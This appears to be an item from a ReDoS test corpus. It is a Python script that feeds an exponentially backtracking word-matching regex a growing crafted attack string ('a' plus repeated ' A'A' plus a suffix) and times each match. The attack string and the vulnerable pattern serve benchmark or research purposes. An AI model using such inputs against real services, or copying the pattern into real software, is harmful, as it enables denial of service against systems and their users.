# 8377
# ^((\'|\")?[a-zA-Z]+(?:\-[a-zA-Z]+)?(?:s\'|\'[a-zA-Z]{1,2})?(?:(?:(?:\,|\.|\!|\?)?(?:\2)?)|(?:(?:\2)?(?:\,|\.|\!|\?)?))(?: (\'|\")?[a-zA-Z]+(?:\-[a-zA-Z]+)?(?:s\'|\'[a-zA-Z]{1,2})?(?:(?:(?:\,|\.|\!|\?)?(?:\2|\3)?)|(?:(?:\2|\3)?(?:\,|\.|\!|\?)?)))*)$
# EXPONENT
# nums:4
# EXPONENT AttackString:"a"+" A'A"*32+"◎@! _1_EOA(i or ii)"

import re
from time import perf_counter

regex = """^((\'|\")?[a-zA-Z]+(?:\-[a-zA-Z]+)?(?:s\'|\'[a-zA-Z]{1,2})?(?:(?:(?:\,|\.|\!|\?)?(?:\2)?)|(?:(?:\2)?(?:\,|\.|\!|\?)?))(?: (\'|\")?[a-zA-Z]+(?:\-[a-zA-Z]+)?(?:s\'|\'[a-zA-Z]{1,2})?(?:(?:(?:\,|\.|\!|\?)?(?:\2|\3)?)|(?:(?:\2|\3)?(?:\,|\.|\!|\?)?)))*)$"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "a" + " A\'A" * i * 1 + "◎@! _1_EOA(i or ii)"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")